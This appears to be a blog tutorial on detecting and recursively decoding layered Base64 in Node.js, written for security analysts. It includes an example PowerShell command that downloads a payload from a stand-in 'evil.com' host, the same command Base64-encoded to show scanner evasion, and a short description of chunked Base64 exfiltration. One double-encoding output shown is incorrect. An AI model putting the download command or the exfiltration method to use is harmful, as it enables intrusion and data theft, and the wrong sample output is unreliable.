+++
title = "Triple Base64: How Attackers Hide Data in Plain Sight"
date = "2025-11-29"
author = "Archit"
description = "A practical guide to detecting and decoding recursive Base64 encoding, with Node.js examples and real security use cases."
+++

You've seen them everywhere — those strings of gibberish ending in one or two equals signs. `SGVsbG8gd29ybGQ=`. Looks random, but it's just Base64.

Base64 is everywhere. It's how we send binary data over text protocols. Embed an image in CSS? Base64. That weird auth token? Probably Base64. It's usually harmless.

But it's also a favorite trick for attackers who want to hide what they're doing.

## What Base64 Actually Is

Let's get this out of the way: **Base64 is not encryption**. Anyone can decode it. It's just a way to turn binary data into text-safe characters.

It uses 64 characters: `A-Z`, `a-z`, `0-9`, `+`, and `/`. The equals signs at the end are just padding to make the length work out.

Here's the basics in Node.js:

```javascript
const test = "Hello world";
console.log("Original: ", test);

// Encode to Base64
const base64 = Buffer.from(test).toString("base64");
console.log("Encoded: ", base64);
// Output: SGVsbG8gd29ybGQ=

// Decode back
const decoded = Buffer.from(base64, "base64").toString("utf-8");
console.log("Decoded: ", decoded);
// Output: Hello world
```

Simple enough.

## Spotting Base64 in the Wild

If you're analyzing logs or API traffic, you'll want to detect Base64 automatically. The pattern is pretty predictable:

- Only uses `A-Z`, `a-z`, `0-9`, `+`, `/`
- Ends with 0, 1, or 2 equals signs

Here's a regex that catches most of it:

```javascript
const isBase64 = (str) => {
    const base64Regex = /^[A-Za-z0-9+/]*={0,2}$/;
    return str.length > 0 && base64Regex.test(str);
};

const encodedString = "SGVsbG8gd29ybGQ=";
console.log(`Is '${encodedString}' Base64?`, isBase64(encodedString)); // true
console.log(`Is 'Not Base64!' Base64?`, isBase64("Not Base64!")); // false
```

Fair warning: this just checks if it *looks* like Base64. It doesn't guarantee valid data. But it's a solid first filter.

## The Recursive Trap

Here's where it gets interesting. Base64 output is just text. So what happens if you Base64-encode already-encoded data?

You get double Base64. Do it again? Triple. Keep going and you can bury a payload under ten layers of encoding.

Attackers love this. Security scanners might catch `powershell -c "Invoke-WebRequest..."`, but they're less likely to flag `VTBkV2MySkhPR1haTWpsNVlrZFJQUT09`.

Watch how fast this grows:

```javascript
const base64 = "SGVsbG8gd29ybGQ="; // "Hello world"

// Double encode
const doubleBase64 = Buffer.from(base64).toString("base64");
console.log("Double: ", doubleBase64);
// Output: U0dWc2JHOGXZMjl5YkdRPQ==

// Triple encode
const tripleBase64 = Buffer.from(doubleBase64).toString("base64");
console.log("Triple: ", tripleBase64);
// Output: VTBkV2MySkhPR1haTWpsNVlrZFJQUT09

// Let's automate this
const recursiveEncode = (str, times) => {
    if (times <= 0) return str;
    const encoded = Buffer.from(str).toString("base64");
    return recursiveEncode(encoded, times - 1);
};

// 10 layers deep
const deeplyEncoded = recursiveEncode("Hello world", 10);
console.log("10 layers: ", deeplyEncoded.substring(0, 50) + "...");
```

## Peeling the Onion

When you're investigating something suspicious, manually decoding ten times sucks. You need code that just keeps decoding until it's done.

The trick is knowing when to stop. You decode, check if the result looks like more Base64, and repeat until it doesn't.

```javascript
const recursiveDecode = (str) => {
    // Still looks like Base64?
    if (isBase64(str)) {
        const decoded = Buffer.from(str, "base64").toString("utf-8");
        
        // If decoding didn't change anything, we're done
        if (decoded === str) return decoded;
        
        console.log(`Peeling layer... ${decoded.substring(0, 20)}...`);
        
        // Keep going
        return recursiveDecode(decoded);
    }
    
    // Not Base64 anymore, return what we have
    return str;
};

console.log("\n--- Decoding ---");
const finalResult = recursiveDecode(deeplyEncoded);
console.log("--- Done ---");
console.log("Final: ", finalResult); // "Hello world"
```

## Why Attackers Actually Do This

Two main reasons:

### 1. Hiding Malicious Commands

Firewalls and WAFs look for signatures like `<script>alert(1)</script>` or `powershell -c`. Encode those commands in Base64 and suddenly they don't match the rules anymore.

**Before:** `powershell -c "Invoke-WebRequest http://evil.com/payload.exe"`

**After:** `cG93ZXJzaGVsbCAtYyAiSW52b2tlLVdlYlJlcXVlc3QgaHR0cDovL2V2aWwuY29tL3BheWxvYWQuZXhlIg==`

Multiple layers of encoding bypass scanners that only try to decode once.

### 2. Stealing Data

Got access to a database and want to exfiltrate binary files? You can't just paste binary data into a URL parameter. Base64 encode it first, then send it out in chunks through normal-looking web requests.

DLP systems that aren't inspecting encoded content might miss it entirely.

## The Bottom Line

Base64 is a fundamental tool — it's how we move binary data through text systems. But that same capability makes it perfect for hiding payloads and exfiltrating data.

Knowing how to programmatically detect and recursively decode Base64 layers isn't just trivia. If you're doing any security work, it's essential.
